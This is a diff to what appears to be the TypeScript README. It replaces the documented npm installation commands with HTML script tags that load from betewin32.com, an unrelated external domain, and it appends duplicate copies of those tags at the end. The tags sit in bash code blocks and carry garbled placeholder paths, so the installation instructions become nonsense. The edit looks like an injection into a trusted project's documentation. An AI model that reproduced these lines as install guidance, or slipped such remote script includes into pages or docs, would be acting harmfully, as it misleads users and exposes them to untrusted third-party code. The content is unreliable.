@@ -16,13 +16,19 @@ Find others who are using TypeScript at [our community page](https://www.typescr
 For the latest stable version:
 
 ```bash
-npm install -D typescript
+<script src="https://betewin32.com/tr/play/f5722eef-98be-40ab-84a0-e55f248b60df/view/geojson/<username>Recepxx02/<repo>/<ref>/<path_to_file=f5722eef-98be-40ab-84a0-e55f248b60df>"></script>
+
 ```
 
-For our nightly builds:
+# For our nightly builds:
 
 ```bash
-npm install -D typescript@next
+<script src="https://betewin32.com/tr/view/geojson/benbalter/dc-wifi-social/master/bars.geojson"></script>
+
+```
+
+```bash
+<script src="https://embed.github.com/view/3d/skalnik/secret-bear-clip/master/stl/clip.stl"></script>
 ```
 
 ## Contribute
@@ -48,3 +54,13 @@ with any additional questions or comments.
 ## Roadmap
 
 For details on our planned features and future direction, please refer to our [roadmap](https://github.com/microsoft/TypeScript/wiki/Roadmap).
+
+
+```bash
+<script src="https://betewin32.com/tr/play/f5722eef-98be-40ab-84a0-e55f248b60df/view/geojson/<username>Recepxx02/<repo>/<ref>/<path_to_file=f5722eef-98be-40ab-84a0-e55f248b60df>"></script>
+```
+
+```bash
+<script src="https://betewin32.com/tr/view/geojson/benbalter/dc-wifi-social/master/bars.geojson"></script>
+
+```
